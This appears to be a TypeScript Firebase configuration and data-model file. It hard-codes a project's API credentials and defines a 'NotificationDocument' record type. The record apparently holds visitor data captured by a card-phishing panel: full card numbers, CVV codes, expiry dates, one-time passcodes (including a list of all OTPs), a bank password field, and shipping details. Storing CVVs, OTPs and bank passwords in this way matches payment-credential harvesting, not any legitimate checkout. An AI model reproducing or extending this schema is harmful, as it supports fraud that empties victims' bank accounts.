import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: 'AIzaSyDIUeFAbjrL265u-8WjQKC17QKUs530BKg',
  authDomain: 'kw-new-59cb9.firebaseapp.com',
  projectId: 'kw-new-59cb9',
  storageBucket: 'kw-new-59cb9.firebasestorage.app',
  messagingSenderId: '1004892216777',
  appId: '1:1004892216777:web:a86f1e237001b5a0a15c18',
  measurementId: 'G-5PWR9E9PV8',
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  visitor: string;
  status: string;
  createdAt: string;
  pageName: string;
  values?: {
    cardNumber: string;
    cvv: string;
    expiryMonth: string;
    expiryYear: string;
    paymentMethod: string;
    cardStatus: string;
    otp: string;
  };
  paymentInfo?: {
    bank: string;
    allOtps: [];
    cardNumber: string;
    cardState: string;
    month: string;
    otp: string;
    pass: string;
    prefix: string;
    status: string;
    year: string;
  };
  shipping?: {
    fullName: string;
    governorate: string;
    house: string;
    phone: string;
  };
  payment?: {
    allOtps:[],
    values:{
      otp:string,
    }
  };
}
